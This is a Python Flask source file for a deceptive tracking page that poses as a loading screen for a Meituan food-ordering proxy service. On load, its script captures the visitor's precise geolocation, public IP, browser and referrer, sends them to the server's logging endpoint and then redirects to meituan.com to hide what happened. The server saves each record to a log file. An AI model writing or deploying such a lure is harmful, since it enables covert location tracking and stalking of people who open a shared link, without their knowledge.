from flask import Flask, request, jsonify, render_template_string
import datetime
import json

app = Flask(__name__)

# ==================== 追踪页面 ====================
TRACKING_HTML = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>加载中...</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
    </style>
</head>
<body>
    <h2>正在进入美团代点，请稍等...</h2>
    <script>
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'IP获取失败';
            }
        }

        function sendDataAndRedirect() {
            if (!navigator.geolocation) {
                redirectNow();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const ip = await getIP();
                    const data = {
                        timestamp: new Date().toISOString(),
                        ip: ip,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' 米',
                        user_agent: navigator.userAgent,
                        referrer: document.referrer
                    };

                    fetch('/api/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).finally(() => {
                        redirectNow();
                    });
                },
                (error) => {
                    console.log('定位失败或被拒绝:', error);
                    redirectNow();
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        function redirectNow() {
            window.location.href = "https://www.meituan.com";
        }

        window.onload = sendDataAndRedirect;
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TRACKING_HTML)

@app.route('/api/log', methods=['POST'])
def log_data():
    try:
        data = request.get_json()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print("\n" + "=" * 80)
        print(f"【{timestamp}】捕获到测试用户数据：")
        print(json.dumps(data, ensure_ascii=False, indent=2))
        print("=" * 80)

        with open('meituan_tracking_logs.json', 'a', encoding='utf-8') as f:
            f.write(json.dumps(data, ensure_ascii=False) + '\n')
        return jsonify({"status": "success"})
    except Exception as e:
        print("记录错误:", e)
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    print("🚀 服务器启动成功！")
    print("本地测试地址: http://127.0.0.1:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)